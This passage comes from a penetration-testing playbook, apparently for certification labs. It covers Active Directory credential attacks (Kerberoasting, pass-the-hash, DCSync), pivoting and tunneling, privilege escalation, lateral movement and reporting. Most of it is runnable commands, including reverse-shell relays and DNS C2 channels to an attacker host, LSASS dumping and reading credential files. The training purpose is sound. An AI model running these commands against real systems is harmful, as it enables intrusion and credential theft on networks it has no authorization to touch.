│  │   hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
│  │
│  └─ From Windows:
│      # Find SPN accounts
│      Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
│      # Request ticket
│      Get-DomainSPNTicket -User SPNUser
│      # Or use Rubeus
│      .\Rubeus.exe kerberoast /outfile:hashes.txt
```

**Impact of cracked service account:**
- SQL SPN account → likely sysadmin on SQL server → enable xp_cmdshell → code execution
- High-priv service account → potentially Domain Admin access
- Even low-priv cracked account → can forge service tickets for that SPN

---

## 8.11 AS-REP Roasting (No Pre-Auth Required)

**WHEN:** You have a user list but NO credentials (or any domain user).

**WHY:** Some accounts have "Do not require Kerberos pre-authentication" set. You can request AS-REP hashes without any authentication — crack offline.

```bash
impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.hashes
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
```

---

## 8.12 Pass-the-Hash & Hash Spraying

**WHEN:** You have an NTLM hash (from cracked NTLMv2, SAM dump, or LSASS).

```bash
# Pass-the-Hash with psexec
psexec.py domain/user@$IP -hashes :NThash

# Hash spraying across subnet (local auth only!)
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H NThash | grep +
```

---

## PATH D: Domain Dominance

## 8.13 DCSync (Domain Admin Required)

**WHEN:** You have Domain Admin (or equivalent) rights.

**WHY:** DCSync replicates all domain credentials hashes — gives you every password in the domain.

```bash
impacket-secretsdump domain/user:'pass'@$DC
```

---

## 8.14 Advanced ACL Attacks

```powershell
# Add user to privileged group
Add-DomainGroupMember -Identity 'TargetGroup' -Members 'User' -Credential $Cred

# Fake SPN injection → then Kerberoast
Set-DomainObject -Identity targetuser -SET @{serviceprincipalname='fake/SPN'}
# Now Kerberoast the user
```

---

## 8.15 Complete AD Tool Arsenal Reference

| Tool | Platform | Purpose |
|------|----------|---------|
| Responder | Linux | LLMNR/NBT-NS poisoning |
| Inveigh | Windows | LLMNR/NBT-NS poisoning |
| Kerbrute | Go binary | User enum + password spraying |
| CrackMapExec/nxc | Linux/Python | SMB/WMI/WinRM/MSSQL enum & attacks |
| GetUserSPNs.py | Linux/Python | Kerberoasting |
| GetNPUsers.py | Linux/Python | AS-REP roasting |
| BloodHound.py | Linux/Python | AD mapping from Linux |
| SharpHound | Windows/C# | AD data collection |
| PowerView | Windows/PowerShell | AD situational awareness |
| SharpView | Windows/.NET | Stealthy PowerView |
| windapsearch | Linux/Python | LDAP queries |
| enum4linux-ng | Linux/Python | SMB enumeration |
| psexec.py | Linux/Python | Remote execution (uploads to ADMIN$) |
| wmiexec.py | Linux/Python | Remote execution (no file drop) |
| secretsdump.py | Linux/Python | DCSync, SAM/LSA dump |
| evil-winrm | Linux/Ruby | WinRM shell |
| Snaffler | Windows/C# | Credential hunting across shares |
| Rubeus | Windows/C# | Kerberos abuse |
| Mimikatz | Windows/C# | Credential extraction, PTH |
| LAPSToolkit | Windows/PowerShell | LAPS auditing |

---

**→ END OF SECTION 8.**
- IF Domain Admin achieved → Section 8.13 (DCSync) → document → Section 12
- IF lateral movement needed → Section 8.10-8.12 → Section 11
- IF new network discovered during AD work → Section 9 (pivot) → Section 3 (scan new subnet)
- IF stuck → "I'm Stuck" Recovery Loop → Section 11.5

---

# ═══════════════════════════════════════════════════════════
# SECTION 9: PIVOTING, TUNNELING & PORT FORWARDING
# ═══════════════════════════════════════════════════════════

## 9.1 DECISION: What Pivoting Technique to Use?

```
┌─ DECISION: What do you have on the pivot host?
│  │
│  ├─ IF SSH access → Section 9.2 (SSH pivoting — easiest)
│  │   ├─ Need specific port only → SSH Local Port Forward (-L)
│  │   ├─ Need entire network → SSH Dynamic Port Forwarding (-D) + proxychains
│  │   └─ Need VPN-like routing (no proxychains) → sshuttle
│  │
│  ├─ IF Meterpreter session → Section 9.3 (Meterpreter pivoting)
│  │   ├─ Full network → autoroute + socks_proxy
│  │   └─ Specific port → portfwd
│  │
│  ├─ IF no SSH, no Meterpreter → Section 9.4/9.5 (relay tools)
│  │   ├─ Socat (bidirectional relay)
│  │   └─ Chisel (SOCKS5 over HTTP/SSH)
│  │
│  ├─ IF Windows-only environment → Section 9.6/9.7
│  │   ├─ Plink.exe + Proxifier
│  │   └─ SocksOverRDP (via RDP session)
│  │   └─ Netsh portproxy
│  │
│  ├─ IF multi-hop (3+ networks) → Section 9.8 (Ligolo-ng — most efficient)
│  │
│  ├─ IF only DNS allowed → Section 9.9 (dnscat2)
│  │
│  ├─ IF only ICMP (ping) allowed → Section 9.10 (ptunnel-ng)
│  │
│  └─ IF HTTP-restricted firewall → Section 9.11 (Rpivot)
```

---

## 9.2 SSH-Based Pivoting

### SSH Local Port Forward (Specific Port Only)

**WHEN:** You need access to ONE specific service on or behind the pivot.

**WHY:** Direct port relay — simple, reliable, no extra tools needed.

```bash
# Forward target:3306 to your localhost:1234
ssh -L 1234:localhost:3306 ubuntu@$PIVOT_IP

# Now access locally:
mysql -h 127.0.0.1 -P 1234 -u root -p

# Multiple ports:
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@$PIVOT
```

### SSH Dynamic Port Forwarding (SOCKS Proxy — Full Network)

**WHEN:** You discovered a NEW NETWORK behind the pivot and need access to the ENTIRE subnet.

**WHY:** Creates a SOCKS proxy — all traffic through pivot. Most common pivoting technique.

```bash
# Start SOCKS proxy on your localhost:9050
ssh -D 9050 ubuntu@$PIVOT_IP

# Configure proxychains — ADD TO LAST LINE of /etc/proxychains.conf:
socks4 127.0.0.1 9050
# Note: May need socks5 instead of socks4 depending on version

# Now ANY tool works through proxychains:
proxychains nmap -v -Pn -sT 172.16.5.19     # MUST use -sT (full TCP connect)!
proxychains nmap -v -sn 172.16.5.1-200       # host discovery
proxychains msfconsole                        # Metasploit
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123 /cert:ignore  # RDP
```

> **CRITICAL:** Only `-sT` (full TCP connect scan) works through proxychains. SYN scans (`-sS`) send partial packets and return INCORRECT results.

### SSH Remote Port Forwarding (When Target Can't Reach You)

**WHEN:** The target host cannot route back to your attack machine.

**WHY:** Exposes your listener THROUGH the pivot to the target.

```bash
# On pivot — forward pivot:8080 to attacker:8000
ssh -R $PIVOT_IP:8080:0.0.0.0:8000 ubuntu@$TARGET -vN
# -v: verbose, -N: no remote command

# Traffic flow: Windows Target → Pivot:8080 → SSH Tunnel → Attacker:8000
# Then: msfvenom payload with LHOST=pivot_ip, LPORT=8080 → execute on target
```

> **When NOT to just use RDP:** RDP clipboard may be disabled (can't transfer files), you can't run low-level exploits, and Meterpreter enumeration isn't available through RDP.

### sshuttle (VPN-Like — No Proxychains Needed)

**WHEN:** You have SSH access and want automatic routing without configuring proxychains.

**WHY:** Creates iptables rules — all traffic to the target subnet routes through the pivot automatically.

```bash
sudo sshuttle -r ubuntu@$PIVOT 172.16.5.0/23 -v
# Now you can use tools DIRECTLY — no proxychains needed
nmap 172.16.5.19 -p3389 -sT -v -Pn
```

> Only works over SSH. Simplest technique when available.

---

## 9.3 Meterpreter Pivoting

**WHEN:** You have a Meterpreter shell on the pivot host.

### AutoRoute + SOCKS Proxy
```
# In Metasploit:
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
run

# Then configure SOCKS proxy:
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run

# Now proxychains works: proxychains.conf → socks4 127.0.0.1 9050
```

### Port Forwarding (specific port)
```
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
# Then: xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

### Reverse Port Forwarding
```
meterpreter > portfwd add -R -l 8081 -p 1234 -L $ATTACKER_IP
# Pivot listens on 1234 → forwards to attacker:8081
# Payload: LHOST=pivot_ip, LPORT=1234
```

---

## 9.4 Socat Redirection

**WHEN:** No SSH, no Meterpreter — you need a relay between two network channels.

**WHY:** Socat creates bidirectional pipes between any two network endpoints without SSH.

```bash
# Reverse shell via Socat relay:
# Pivot: listens on 8080, forwards to attacker:80
socat TCP4-LISTEN:8080,fork TCP4:$ATTACKER_IP:80

# Payload: LHOST=pivot_ip, LPORT=8080
# Attacker: msf listener on port 80
```

```bash
# Bind shell via Socat relay:
# Pivot: listens on 8080, forwards to Windows target:8443
socat TCP4-LISTEN:8080,fork TCP4:$TARGET_IP:8443

# Attacker: connect to pivot:8080 with bind handler
```

---

## 9.5 Chisel (SOCKS5 over HTTP/SSH)

**WHEN:** Need fast TCP/UDP tunnel through HTTP-restricted firewalls. No SSH available.

**WHY:** Chisel creates SOCKS5 over HTTP, secured with SSH. Faster than SSH SOCKS in some scenarios.

> **WARNING:** glibc version mismatch between target and workstation causes errors. If chisel fails, use an older prebuilt binary from GitHub Releases.

```
┌─ Direction needed?
│  ├─ FORWARD (server on pivot):
│  │   # Pivot: ./chisel server -v -p 1234 --socks5
│  │   # Attacker: ./chisel client -v $PIVOT:1234 socks
│  │   # SOCKS on attacker:1080 → proxychains: socks4 127.0.0.1 1080
│  │
│  └─ REVERSE (server on attacker — when pivot can't receive inbound):
│      # Attacker: ./chisel server --reverse -v -p 1234 --socks5
│      # Pivot: ./chisel client -v $ATTACKER:1234 R:socks
```

**Binary size reduction (for evasion):**
```bash
go build -ldflags="-s -w"    # strip debug and dwarf info
upx brute chisel              # compress
du -hs chisel                 # check size
```

---

## 9.6 Windows-Only Pivoting

### Plink.exe + Proxifier

**WHEN:** On Windows pivot, need SSH SOCKS tunnel.

```cmd
# Plink (PuTTY Link) — SSH SOCKS from Windows
plink -ssh -D 9050 ubuntu@$PIVOT

# Then configure Proxifier:
# Profile → Proxy Servers → Add → 127.0.0.1:9050 SOCKS5
# Profile → Proxyfication Rules → Add rule for target subnet
# Now mstsc.exe, browser, any app routes through tunnel
```

### SocksOverRDP

**WHEN:** Only RDP access to pivot, need to reach further networks.

**WHY:** Uses Dynamic Virtual Channels (DVC) in RDP to carry SOCKS5 traffic — no SSH needed.

```
1. Register plugin on attacker:
   regsvr32.exe SocksOverRDP-Plugin.dll
   → Popup confirms: listening on 127.0.0.1:1080

2. RDP to pivot:
   mstsc.exe → connect to pivot
   → Plugin auto-loads, tunnel established

3. Deploy server on pivot (as Administrator):
   Run SocksOverRDP-Server.exe as Admin
   Verify: netstat -antb | findstr 1080

4. Configure Proxifier on attacker:
   Forward ALL traffic through 127.0.0.1:1080
   → Any tool now routes through RDP tunnel
```

**Traffic flow:**
```
Tool → Proxifier → 127.0.0.1:1080 → SocksOverRDP Plugin → RDP Session → SocksOverRDP Server → Internal Target
```

### Netsh Port Forwarding

**WHEN:** Simple port forward on Windows pivot.

```cmd
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=$PIVOT_IP connectport=3389 connectaddress=$TARGET_IP
netsh.exe interface portproxy show v4tov4   # verify
# Then: xfreerdp /v:$PIVOT_IP:8080 /u:user /p:pass /cert:ignore
```

---

## 9.7 Ligolo-ng (Multi-Hop Pivoting — Most Efficient)

**WHEN:** Need to pivot through MULTIPLE network segments (2+ hops).

**WHY:** TUN-based, highly efficient, supports multi-hop chaining without proxychains.

### Setup
```bash
# Create TUN interface
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up

# Start proxy
sudo ./proxy -selfcert
# Or: sudo ./proxy -selfcert -laddr 0.0.0.0:11601
```

### Deploy Agent
```bash
# Linux agent: chmod +x agent && ./agent -connect $ATTACKER:11601 -ignore-cert
# Windows agent: agent.exe -connect $ATTACKER:11601 -ignore-cert
```

### Activate
```
# In ligolo-proxy:
session → 1 → start --tun ligolo

# In new terminal:
sudo ip route add 172.16.5.0/24 dev ligolo

# Verify: nmap -Pn -p 22 172.16.5.10
```

### Multi-Hop Chaining
```
┌─ Already have first pivot. Need second network?
│  1. Create NEW TUN: sudo ip tuntap add user $USER mode tun ligolo2 && sudo ip link set ligolo2 up
│  2. On FIRST pivot session in ligolo: listener_add -addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
│  3. Verify: listener_list
│  4. On SECOND pivot: ./agent -connect $FIRST_PIVOT:11601 -ignore-cert
│  5. In ligolo: session → 2 → start --tun ligolo2
│  6. sudo ip route add 172.16.6.0/24 dev ligolo2
│  7. Repeat for each additional hop
```

---

## 9.8 Specialized Tunneling

### dnscat2 (DNS Tunneling)

**WHEN:** Only DNS is allowed through the firewall.

**WHY:** Encapsulates data in DNS TXT queries — bypasses DPI focused on HTTPS. Encrypted C2 channel.

```bash
# Attacker — server (note the secret key it outputs)
sudo ruby dnscat2.rb --dns host=$ATTACKER,port=53,domain=domain.local --no-cache

# Windows target — PowerShell client
Import-Module dnscat2.ps1
Start-Dnscat2 -DNSserver $ATTACKER -Domain domain.local -PreSharedSecret <key_from_server> -Exec cmd

# Interact: window -i 1
```

### ptunnel-ng (ICMP Tunneling)

**WHEN:** Only ICMP (ping) is allowed through the firewall.

```bash
# Build static binary (avoids library issues)
git clone https://github.com/utoni/ptunnel-ng.git
cd ptunnel-ng && sudo ./autogen.sh

# Pivot (server):
sudo ./ptunnel-ng -r$PIVOT_IP -R22

# Attacker (client — MUST use -l2222 for the tunnel):
sudo ./ptunnel-ng -p$PIVOT_IP -l2222 -r$PIVOT_IP -R22

# Then SSH through the tunnel:
ssh -p2222 -lubuntu 127.0.0.1
# Or: SSH dynamic forwarding through ICMP tunnel:
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
# → proxychains nmap -sV -sT 172.16.5.19 -p3389
```

### Rpivot (HTTP Reverse SOCKS)

**WHEN:** Need reverse SOCKS through HTTP-restricted firewalls, with NTLM proxy support.

```bash
git clone https://github.com/klsecservices/rpivot.git
sudo apt install python2.7

# Attacker: python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
# Pivot: python2.7 client.py --server-ip $ATTACKER --server-port 9999
# Use: proxychains firefox-esr 172.16.5.135:80

# With NTLM proxy:
python client.py --server-ip $IP --server-port 8080 --ntlm-proxy-ip $PROXY --ntlm-proxy-port 8081 --domain DOMAIN --username user --password pass
```

---

## 9.9 Network Discovery from Pivot Hosts

**WHEN:** After pivoting to a new network — find live hosts.

```
┌─ What OS is the pivot?
│  ├─ IF Linux: for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done
│  ├─ IF Windows CMD: for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
│  ├─ IF Windows PowerShell: 1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
│  └─ IF Meterpreter: run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

> **IMPORTANT:** Run ping sweep at least TWICE — ARP cache needs time to build across network boundaries.

**NEXT:** IF live hosts found → scan them → Section 3 (port scan) → Section 4 (service attacks)

---

**→ END OF SECTION 9. After pivoting to new network:**
- Scan new hosts → Section 3
- Enumerate services → Section 4
- If AD environment → Section 8
- Always check new hosts for additional NICs → may reveal MORE networks → repeat Section 9

---

# ═══════════════════════════════════════════════════════════
# SECTION 10: PRIVILEGE ESCALATION
# ═══════════════════════════════════════════════════════════

## 10.1 DECISION: Linux or Windows PrivEsc?

```
┌─ What OS is the target?
│  │
│  ├─ IF Linux → PATH A (Section 10.2)
│  │   ├─ sudo -l → GTFOBins
│  │   ├─ SUID binaries → GTFOBins
│  │   ├─ Capabilities → getcap
│  │   ├─ Cron jobs → writable scripts
│  │   ├─ Exposed credentials → config files, history, keys
│  │   ├─ Kernel exploits → uname -a → searchsploit
│  │   └─ Automated → linpeas.sh
│  │
│  └─ IF Windows → PATH B (Section 10.3)
│      ├─ whoami /priv → SeImpersonate, SeDebug
│      ├─ whoami /groups → Backup Operators, DnsAdmins
│      ├─ Unquoted service paths
│      ├─ LSASS dump → pypykatz
│      ├─ Registry/passwords
│      └─ Automated → winPEAS, Seatbelt
```

---

## PATH A: Linux Privilege Escalation

## 10.2 Linux PrivEsc

**WHEN:** IMMEDIATELY after getting any shell on a Linux host.

**ALWAYS check in this order:**

### Step 1: Sudo Rights
```bash
sudo -l
# LOOK FOR: NOPASSWD entries → commands you can run as root
# IF found → go to GTFOBins (https://gtfobins.github.io/) → search the command → follow escalation method
```

### Step 2: SUID Binaries
```bash
find / -perm -4000 2>/dev/null
# LOOK FOR: unusual SUID binaries (not standard like passwd, sudo)
# IF found → GTFOBins → check if it can be exploited
```

### Step 3: Capabilities
```bash
getcap -r / 2>/dev/null
# LOOK FOR: capabilities on unusual binaries
# IF found → e.g., cap_setuid on python → python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Step 4: Cron Jobs
```bash
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /var/spool/cron/crontabs/
# LOOK FOR: writable scripts, scripts running as root with user-writable paths
# IF writable → replace with reverse shell as root
```

### Step 5: Exposed Credentials
```bash
# Check these files:
cat /etc/shadow              # if readable → crack hashes
cat ~/.bash_history           # may contain commands with passwords
cat ~/.ssh/id_rsa             # SSH keys
find / -name "*.conf" -readable 2>/dev/null | grep -i "pass\|pwd\|key"
find / -name "config*" -readable 2>/dev/null | head -20
```

### Step 6: Kernel Exploits
```bash
uname -a
cat /etc/os-release
# Search: searchsploit linux <kernel_version> or Google "Linux <version> privilege escalation"
```

### Step 7: Automated Enumeration
```bash
# LinPEAS (MOST comprehensive — use this first)
./linpeas.sh

# LinEnum
./LinEnum.sh

# linuxprivchecker
python3 linuxprivchecker.py
```

**NEXT:** IF root achieved → `whoami; hostname; id; ip addr` → screenshot everything → Section 12 → check for more hosts

---

## PATH B: Windows Privilege Escalation

## 10.3 Windows PrivEsc

**WHEN:** IMMEDIATELY after getting any shell on a Windows host.

### Step 1: User Privileges
```cmd
whoami /priv
# LOOK FOR:
# SeImpersonatePrivilege → Potato exploits (JuicyPotato, PrintSpoofer, RoguePotato)
# SeDebugPrivilege → process injection, LSASS access
# SeBackupPrivilege → read any file (including SAM, SYSTEM)
# SeRestorePrivilege → modify any file
```

### Step 2: Group Memberships
```cmd
whoami /groups
# LOOK FOR:
# Backup Operators → can read any file
# DnsAdmins → can load DLL as SYSTEM on DC
# Account Operators → can modify user accounts
```

### Step 3: System Information
```cmd
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn    # patches
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\"    # unquoted service paths
```

### Step 4: Unquoted Service Paths
**WHY:** If a service binary path has spaces and isn't quoted (e.g., `C:\Program Files\My Service\service.exe`), Windows tries `C:\Program.exe` first → if you can write there → code execution as service user.

### Step 5: Stored Credentials
```cmd
cmdkey /list                              # cached credentials
reg query HKLM /f password /t REG_SZ /s   # registry passwords
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

### Step 6: LSASS Memory Dump (Credential Extraction)

**WHEN:** You have GUI access (RDP) or sufficient privileges.

**WHY:** LSASS stores logged-on credentials in memory. Dumping it gives you passwords/hashes for all logged-on users.

**HOW — via RDP:**
```
1. RDP with drive redirection:
   xfreerdp /v:$IP /u:user /p:'pass' /drive:loot,/home/kali/lab /cert:ignore

2. On target → Task Manager → Processes tab → right-click "Local Security Authority Process" → Create dump file
   → File saved at: %temp%\lsass.DMP

3. Copy to shared drive:
   copy C:\Users\user\AppData\Local\Temp\lsass.DMP \\tsclient\loot\

4. Extract on attacker:
   pypykatz lsa minidump lsass.DMP
```

### Step 7: Automated Enumeration
```cmd
winPEASx64.exe       # most comprehensive
Seatbelt.exe         # stealthier (C#)
JAWS-enum.ps1        # PowerShell-based
```

**NEXT:** IF SYSTEM/Admin achieved → document → check for more hosts → Section 11 (lateral) or Section 9 (pivot)

---

**→ END OF SECTION 10. After PrivEsc:**
- IF new credentials found → try on other hosts → Section 11
- IF new network interfaces discovered → Section 9 (pivot) → Section 3 (scan new subnet)
- IF domain access → Section 8 (AD attacks)
- Always document with screenshots → Section 12

---

# ═══════════════════════════════════════════════════════════
# SECTION 11: LATERAL MOVEMENT & "I'M STUCK" RECOVERY
# ═══════════════════════════════════════════════════════════

## 11.1 DECISION: How to Move Laterally?

```
┌─ What do you have?
│  ├─ IF cleartext passwords → Section 11.2 (credential reuse)
│  ├─ IF NTLM hashes → Section 11.3 (pass-the-hash)
│  ├─ IF Kerberos tickets → Section 8.10 (Kerberoasting)
│  ├─ IF service account access → Section 8.14 (ACL attacks)
│  ├─ IF mapped network drives → check them (may lead to DC)
│  └─ IF nothing works → Section 11.5 (recovery loop)
```

---

## 11.2 Credential Reuse

**WHEN:** You found passwords on a host.

**WHY:** Users and service accounts reuse passwords across systems. One password = access to many hosts.

```
┌─ What did you find?
│  ├─ IF config files → extract passwords → try on: SSH, SMB, RDP, WinRM, MSSQL, MySQL
│  ├─ IF .bash_history → check for database commands, SSH connections with passwords
│  ├─ If home directories → check .ssh/id_rsa, .bash_history, desktop notes
│  └─ IF service accounts → try same password on similar accounts (ajones → ajones_adm)
```

---

## 11.3 Pass-the-Hash

**WHEN:** You have an NTLM hash (from SAM dump, NTLMv2 crack, LSASS).

```bash
# Against specific host
psexec.py domain/user@$IP -hashes :NThash

# Spraying across subnet (ALWAYS --local-auth for local hashes!)
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H NThash | grep +
```

---

## 11.4 Post-Compromise Systematic Checks (CRITICAL — From Lab Patterns)

**WHEN:** IMMEDIATELY after gaining access to ANY host. These checks have repeatedly been the key to progression in lab/exam scenarios.

```
┌─ After EVERY successful compromise, ALWAYS:
│  │
│  ├─ 1. CHECK FOR ADDITIONAL NICs
│  │   ├─ Linux: ifconfig / ip addr show
│  │   ├─ Windows: ipconfig /all
│  │   └─ IF new NIC on different subnet → YOU MUST PIVOT → Section 9 → Section 3
│  │
│  ├─ 2. CHECK HOME DIRECTORIES FOR CREDENTIALS
│  │   ├─ Linux: ls -la /home/*/.ssh/ && cat /home/*/.bash_history
│  │   ├─ Check web server user dirs for SSH keys and credentials
│  │   └─ Check for files left by previous pentesters (web shells, notes)
│  │
│  ├─ 3. CHECK MAPPED NETWORK DRIVES (Windows)
│  │   ├─ net use → list all mapped drives
│  │   ├─ dir Z:\ → explore mapped drives
│  │   └─ WHY: Mapped drives (e.g., Z:\AutomateDCAdmin) may lead directly to
│  │       DC resources WITHOUT needing to compromise the DC itself
│  │
│  ├─ 4. CHECK WEB DIRECTORIES FOR PERSISTENCE
│  │   ├─ ls -la /var/www/html/ && ls -la /var/www/
│  │   └─ WHY: Previous pentesters may have left web shells — use as re-entry
│  │
│  └─ 5. CHECK FOR PASSWORD PATTERN REUSE
│      ├─ If you found mlefay:Plain Human work! → try similar patterns for other service accounts
│      └─ Organizations often use predictable patterns for service account passwords
```

---

## 11.5 "I'm Stuck" Recovery Loop

**WHEN:** You've tried everything and can't progress.

```
┌─ The Recovery Loop:
│  │
│  1. RE-ENUMERATE: Did you miss any ports? Re-run full scan with different flags
│  2. CHECK CONFIG FILES: wp-config.php, web.config, .env, /etc/hosts, app.config
│  3. CHECK LOCAL SERVICES: Services on 127.0.0.1 that need pivoting
│  4. TRY FALLBACK VECTORS: psexec failed → try wmiexec. wget failed → try certutil
│  5. PASSWORD SPRAY: Use harvested usernames with common passwords
│  6. CHECK RESPONDER LOGS: Hashes may have been captured while you worked elsewhere
│  7. RE-CHECK WEB APP: Try different wordlists, different parameters, different attack types
│  8. CHECK SOURCE CODE AGAIN: Hidden comments, encoded strings, API keys
│  9. TRY DEFAULT CREDENTIALS: On EVERY service, admin panel, and CMS
│  10. LOOK AT THE BIG PICTURE: Draw a network map. What do you know? What don't you know?
```

---

**→ END OF SECTION 11. Use the recovery loop whenever stuck.**

---

# ═══════════════════════════════════════════════════════════
# SECTION 12: REPORTING, CLEANUP & DOCUMENTATION
# ═══════════════════════════════════════════════════════════

## 12.1 Documentation Standards

**WHEN:** AFTER every critical step — not at the end.

**WHY:** Screenshots taken during the engagement are your proof. If you forget, you can't go back.

### Every Screenshot Must Include:
```bash
# Run these THREE commands and include output in every screenshot:
whoami          # current user context
hostname        # machine identification
ipconfig /all   # network context (or ifconfig on Linux)
```

### Reporting Focus — Business Impact, Not Technical Details
```
❌ BAD: "Found SQL injection on login page"
✅ GOOD: "Attacker can extract entire customer database, including PII and payment card data,
          via SQL injection on the login page, resulting in complete data breach of X records"

❌ BAD: "Kerberoasting successful"
✅ GOOD: "Service account credentials obtained via Kerberoasting, providing Domain Admin-level
          access to all systems in the domain, enabling complete organizational compromise"
```

---

## 12.2 Cleanup

**WHEN:** After documenting everything, before ending engagement.

**WHY:** Leave the target as you found it. Unremoved shells = security liability.

```bash
# Linux cleanup
rm /tmp/linpeas.sh
rm /tmp/backup.elf
rm /var/www/html/shell.php
# Remove any users, SSH keys, or cron jobs you added

# Windows cleanup
del C:\Users\Public\nc.exe
del C:\Temp\backupscript.exe
del C:\Temp\winPEASx64.exe
# Remove any users or services you created
```

---

## 12.3 File Organization

Maintain this structure throughout the engagement (not just at the end):

```
target_name/
├── nmap/
│   ├── allports.nmap          # Full TCP scan results
│   ├── detailed.nmap          # Service version results
│   └── udp.nmap               # UDP scan results
├── scans/
│   ├── discovery.nmap         # Host discovery
│   └── quick.nmap             # Quick top-1000 scan
├── exploits/
│   ├── payload.exe            # Generated payloads
│   └── shell.php              # Web shells deployed
├── loot/
│   ├── hashes/                # Cracked hashes
│   ├── credentials/           # Found credentials
│   └── extracted_data/        # Exfiltrated files
├── notes/                     # Your engagement notes
└── screenshots/               # Proof screenshots (whoami, hostname, ipconfig)
```

---

**→ END OF SECTION 12. Engagement complete.**

---

# ═══════════════════════════════════════════════════════════
# APPENDIX A: MASTER QUICK REFERENCE — PORTS & SERVICES
# ═══════════════════════════════════════════════════════════

| Port | Service | FIRST Thing to Try | IF That Fails | Key Tool |
|------|---------|-------------------|---------------|----------|
| 21 | FTP | Anonymous login | Brute force | hydra, wget -m |
| 22 | SSH | Found creds/key | SSH-audit for vulns | ssh, ssh-audit |
| 25 | SMTP | VRFY user enum | Open relay check | smtp-user-enum |
| 53 | DNS | Zone transfer | Subdomain brute | dig, dnsenum |
| 80/443 | HTTP/S | whatweb + source review | gobuster + vHost | ffuf, gobuster |
| 88 | Kerberos | AS-REP roasting | Kerberoasting | GetUserSPNs.py |
| 110/995 | POP3 | openssl s_client → login | Check for creds in emails | openssl |
| 111/2049 | NFS | showmount -e | Mount and enum | mount, ls -ln |
| 135 | WMI/RPC | rpcclient null session | wmiexec with creds | rpcclient, wmiexec |
| 139/445 | SMB | Null session enum | RID cycling | smbclient, rpcclient |
| 143/993 | IMAP | openssl → login → check mail | Look for SSH keys in emails | openssl |
| 161 | SNMP | onesixtyone brute | snmpwalk | onesixtyone, braa |
| 389/636 | LDAP | Anonymous bind | windapsearch with creds | ldapsearch, windapsearch |
| 623 | IPMI | Version scan | Hash dump + crack | ipmi_dumphashes |
| 873 | Rsync | Probe with nc | Enumerate shares | rsync |
| 1433 | MSSQL | Empty password | xp_cmdshell | impacket-mssqlclient |
| 1521 | Oracle | Default passwords (scott/tiger) | ODAT enum | odat.py, sqlplus |
| 3306 | MySQL | Empty root password | Enumerate DBs | mysql |
| 3389 | RDP | Found credentials | SocksOverRDP | xfreerdp |
| 5985/86 | WinRM | Found credentials | evil-winrm | evil-winrm |
| 512/513/514 | R-Services | Trust-based login | nmap version scan | rlogin, rsh |

---

# APPENDIX B: ESSENTIAL RESOURCES

| Resource | URL | Use For |
|----------|-----|---------|
| GTFOBins | https://gtfobins.github.io/ | Linux PrivEsc via sudo/SUID/capabilities |
| LOLBAS | https://lolbas-project.github.io/ | Windows LOL techniques |
| HackTricks | https://book.hacktricks.xyz/ | Comprehensive checklists |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings | Reverse shells, injection payloads |
| Reverse Shell Cheat Sheet | https://github.com/swisskyrepo/PayloadsAllTheThings/.../Reverse%20Shell%20Cheatsheet.md | Shell one-liners |
| Hashcat Examples | https://hashcat.net/wiki/doku.php?id=example_hashes | Hash type modes |
| Chisel Cheatsheet | https://0xdf.gitlab.io/cheatsheets/chisel | Chisel usage reference |
| WADComs | https://wadcoms.github.io/ | Windows AD commands |
| IppSec CPTS Prep | https://www.youtube.com/playlist?list=PLidcsTyj9JXItWpbRtTg6aDEj10_F17x5 | Video walkthroughs |

---

# APPENDIX C: THE COMPLETE ATTACK FLOW — VISUAL SUMMARY

```
  ┌──────────────────────────────────────────────────────────────────┐
  │  EXTERNAL: Domain → DNS/Subdomains → IPs → Shodan → Breach data │
  └─────────────────────────┬────────────────────────────────────────┘
                            ▼
  ┌──────────────────────────────────────────────────────────────────┐
  │  NETWORK: Host discovery → Full TCP scan → UDP scan → Services  │
  └─────────────────────────┬────────────────────────────────────────┘
                            ▼
  ┌──────────────────────────────────────────────────────────────────┐
  │  SERVICES: Per-port enum → Find vuln/creds → Attack → Shell     │
  └─────────────────────────┬────────────────────────────────────────┘
                            ▼
  ┌──────────────────────────────────────────────────────────────────┐
  │  WEB: Fingerprint → Dir brute → vHost → CMS → LFI/SQLi → Shell  │
  └─────────────────────────┬────────────────────────────────────────┘
                            ▼
  ┌──────────────────────────────────────────────────────────────────┐
  │  POST-EXPLOIT: TTY stabilize → Transfer tools → Enumerate host  │
  └─────────────────────────┬────────────────────────────────────────┘
                            ▼
  ┌──────────────────────────────────────────────────────────────────┐
  │  PRIVILEGE ESC: sudo/SUID/cron/caps (Linux) or Tokens/LSASS (Win)│
  └─────────────────────────┬────────────────────────────────────────┘
                            ▼
  ┌──────────────────────────────────────────────────────────────────┐
  │  CHECK: Additional NICs? → New network → PIVOT (SSH/Chisel/Ligolo)│
  └─────────────────────────┬────────────────────────────────────────┘
                            ▼
